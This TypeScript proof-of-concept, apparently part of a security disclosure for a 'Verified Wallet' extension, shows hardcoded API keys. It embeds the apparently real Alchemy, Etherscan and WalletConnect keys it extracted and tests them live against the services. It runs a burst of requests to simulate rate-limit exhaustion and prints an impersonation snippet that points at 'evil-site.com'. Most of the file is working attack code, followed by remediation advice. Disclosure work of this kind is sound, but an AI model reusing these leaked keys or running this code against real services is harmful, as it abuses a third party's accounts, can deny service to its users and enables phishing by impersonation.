/**
 * PoC #3: Hardcoded API Keys Exposure
 * 
 * Vulnerability: The extension exposes multiple API keys in client-side code:
 * - Alchemy API key: 82hkNrfu6ZZ8Wms2vr1U331ml3FtS7AZ
 * - Etherscan API key: M8SGUPC8CXRTER5GGTSSXW7C9A1ZINWWYA
 * - WalletConnect Project ID: 90b0e2ff886ba98147f2780659cf12a6
 * 
 * Impact:
 * 1. API rate limits can be exhausted, causing DoS for legitimate users
 * 2. Usage patterns can be tracked
 * 3. Potential for account suspension if keys are abused
 * 4. WalletConnect projectId could allow impersonation
 * 
 * Severity: MEDIUM (CVSS 4.0-6.9)
 */

// Extracted API keys from the extension source code
const EXTRACTED_KEYS = {
  alchemy: {
    key: "82hkNrfu6ZZ8Wms2vr1U331ml3FtS7AZ",
    endpoints: {
      ethereum: "https://eth-mainnet.g.alchemy.com/v2/82hkNrfu6ZZ8Wms2vr1U331ml3FtS7AZ",
      base: "https://base-mainnet.g.alchemy.com/v2/82hkNrfu6ZZ8Wms2vr1U331ml3FtS7AZ",
      sepolia: "https://eth-sepolia.g.alchemy.com/v2/82hkNrfu6ZZ8Wms2vr1U331ml3FtS7AZ"
    }
  },
  etherscan: {
    key: "M8SGUPC8CXRTER5GGTSSXW7C9A1ZINWWYA",
    apiUrl: "https://api.etherscan.io/v2/api"
  },
  walletConnect: {
    projectId: "90b0e2ff886ba98147f2780659cf12a6"
  }
};

/**
 * PoC 3a: Test Alchemy API key validity and get usage info
 */
async function testAlchemyKey(): Promise<void> {
  console.log("🔑 Testing Alchemy API Key...\n");
  
  try {
    const response = await fetch(EXTRACTED_KEYS.alchemy.endpoints.ethereum, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        jsonrpc: "2.0",
        id: 1,
        method: "eth_blockNumber",
        params: []
      })
    });
    
    const data = await response.json();
    
    if (data.result) {
      const blockNumber = parseInt(data.result, 16);
      console.log("✅ Alchemy key is VALID and ACTIVE!");
      console.log(`   Current Ethereum block: ${blockNumber}`);
      console.log(`   Key: ${EXTRACTED_KEYS.alchemy.key}`);
      console.log("\n   ⚠️  This key could be rate-limited by attackers");
    } else if (data.error) {
      console.log("❌ Key appears invalid or rate-limited:", data.error);
    }
  } catch (e) {
    console.log("Error testing Alchemy key:", e);
  }
}

/**
 * PoC 3b: Test Etherscan API key
 */
async function testEtherscanKey(): Promise<void> {
  console.log("\n🔑 Testing Etherscan API Key...\n");
  
  try {
    const url = `${EXTRACTED_KEYS.etherscan.apiUrl}?chainid=1&module=account&action=balance&address=0x0000000000000000000000000000000000000000&tag=latest&apikey=${EXTRACTED_KEYS.etherscan.key}`;
    
    const response = await fetch(url);
    const data = await response.json();
    
    if (data.status === "1") {
      console.log("✅ Etherscan key is VALID and ACTIVE!");
      console.log(`   Key: ${EXTRACTED_KEYS.etherscan.key}`);
      console.log("\n   ⚠️  This key could be used to make 5 req/sec");
      console.log("   ⚠️  Abuse could get the key blocked for legitimate users");
    } else {
      console.log("❌ Key issue:", data.message || data.result);
    }
  } catch (e) {
    console.log("Error testing Etherscan key:", e);
  }
}

/**
 * PoC 3c: Demonstrate WalletConnect ProjectID can be used
 * This shows how an attacker could impersonate the wallet
 */
function demonstrateWalletConnectImpersonation(): void {
  console.log("\n🔑 WalletConnect Project ID Exposure...\n");
  
  console.log(`Project ID: ${EXTRACTED_KEYS.walletConnect.projectId}`);
  console.log("\n⚠️  Risks:");
  console.log("   1. Attacker can create fake wallet connections using this ID");
  console.log("   2. Usage metrics will be inflated/manipulated");
  console.log("   3. Potential for phishing by impersonating 'Verified Wallet'");
  console.log("\n📝 Example malicious usage:");
  console.log(`
  import { WalletKit } from "@reown/walletkit";
  
  // Attacker impersonating Verified Wallet
  const fakeWallet = await WalletKit.init({
    core: new Core({
      projectId: "${EXTRACTED_KEYS.walletConnect.projectId}"
    }),
    metadata: {
      name: "Verified Wallet Extension",  // Same name!
      description: "Fake wallet impersonating the real one",
      url: "https://evil-site.com",
      icons: ["https://..."] // Can use same icon
    }
  });
  `);
}

/**
 * PoC 3d: Rate limit exhaustion attack simulation
 */
async function simulateRateLimitAttack(): Promise<void> {
  console.log("\n🔥 Simulating Rate Limit Exhaustion Attack (10 rapid requests)...\n");
  console.log("⚠️  This is a SIMULATION - not actually exhausting limits\n");
  
  const requestCount = 10;
  const results: { success: number; failed: number } = { success: 0, failed: 0 };
  
  console.log("Making rapid requests to Alchemy endpoint...");
  
  for (let i = 0; i < requestCount; i++) {
    try {
      const response = await fetch(EXTRACTED_KEYS.alchemy.endpoints.ethereum, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: i,
          method: "eth_gasPrice",
          params: []
        })
      });
      
      const data = await response.json();
      if (data.result) {
        results.success++;
        process.stdout.write("✅");
      } else {
        results.failed++;
        process.stdout.write("❌");
      }
    } catch {
      results.failed++;
      process.stdout.write("❌");
    }
  }
  
  console.log("\n\nResults:");
  console.log(`   Success: ${results.success}/${requestCount}`);
  console.log(`   Failed:  ${results.failed}/${requestCount}`);
  
  if (results.failed > 0) {
    console.log("\n⚠️  Some requests failed - possible rate limiting detected!");
  } else {
    console.log("\n✅ All requests succeeded");
    console.log("   An attacker could scale this up to exhaust API limits");
  }
}

// Main execution
async function main(): Promise<void> {
  console.log("=" .repeat(60));
  console.log("VERIFIED WALLET - API KEY EXPOSURE PoC");
  console.log("=" .repeat(60) + "\n");
  
  console.log("📋 EXTRACTED API KEYS:");
  console.log(JSON.stringify(EXTRACTED_KEYS, null, 2));
  console.log("\n" + "-".repeat(60));
  
  await testAlchemyKey();
  await testEtherscanKey();
  demonstrateWalletConnectImpersonation();
  await simulateRateLimitAttack();
  
  console.log("\n" + "=".repeat(60));
  console.log("RECOMMENDATIONS:");
  console.log("  1. Use server-side proxy for RPC calls");
  console.log("  2. Rotate exposed API keys immediately");
  console.log("  3. Implement rate limiting on client side");
  console.log("  4. Consider using environment-specific keys");
  console.log("=".repeat(60));
}

main().catch(console.error);

export { EXTRACTED_KEYS, testAlchemyKey, testEtherscanKey };
